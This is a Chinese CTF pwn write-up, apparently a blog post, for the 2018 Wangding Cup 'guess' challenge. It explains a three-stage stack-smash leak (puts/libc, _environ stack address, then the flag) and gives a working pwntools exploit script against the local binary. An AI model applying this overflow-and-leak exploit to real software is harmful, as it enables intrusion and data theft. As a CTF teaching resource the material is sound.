---
title: 花式栈溢出- stack smash2
date:  2020-07-09 13:02:51
updated: 2020-07-09 13:02:51
tags:
    - 花式栈溢出
    - wiki
    - pwn
categories: 
	- 二进制安全
	- wiki-pwn
use:
  - Valine
text: true
lazyload: true
count: true
---
# 1.查看

2018 网鼎杯 - guess

![image.png](https://i.loli.net/2020/11/17/t8yKZOnLfmFHCjd.png)

# 2.ida分析

![image.png](https://i.loli.net/2020/11/17/sOxUpM16l9GXBAr.png)

程序先从文件中读取flag放入栈中，在从输入覆盖flag，并给了三次机会输入。

三次可以通过stack smash分别leak puts（libc）、栈地址，flag

# 3.编写脚本

```python
#!/usr/bin/env python
#coding=utf-8
from pwn import *
my_u64 = lambda x: u64(x.ljust(8, '\0'))
context.log_level = 'debug'
p=process('./GUESS')
elf=ELF('./GUESS')
libc = elf.libc
p.recvuntil('Please type your guessing flag\n')
payload='a'*296+p64(elf.got['puts'])
p.sendline(payload)
p.recvuntil('*** stack smashing detected ***: ')
puts=my_u64(p.recv(6))


libc_base = puts - libc.symbols['puts']
environ_addrs = libc_base + libc.symbols['_environ']
payload2 = 296 * 'a' + p64(environ_addrs)
p.recvuntil('guessing flag\n')
p.sendline(payload2)
p.recvuntil('*** stack smashing detected ***: ')
stack=my_u64(p.recv(6))
#print hex(stack)

p.recvuntil('guessing flag\n')
payload3 = 296 * 'a' + p64(stack - 0x168)
p.sendline(payload3)
p.interactive()
```